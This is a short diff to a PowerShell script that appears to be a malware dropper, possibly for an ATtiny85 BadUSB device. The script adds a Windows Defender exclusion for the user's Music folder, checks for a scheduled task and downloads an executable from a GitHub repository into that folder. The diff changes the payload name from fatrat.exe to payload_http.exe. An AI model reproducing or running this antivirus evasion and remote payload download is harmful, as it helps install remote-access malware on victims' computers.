@@ -20,7 +20,7 @@ if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) 
 Add-MpPreference -ExclusionPath "$env:USERPROFILE\Music"
 Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 
-$url = "https://github.com/armanina444/deadly-spark-attiny85/raw/refs/heads/main/fatrat.exe"
+$url = "https://github.com/armanina444/deadly-spark-attiny85/raw/refs/heads/main/payload_http.exe"
 $dest = "$env:USERPROFILE\Music\fatrat.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $dest
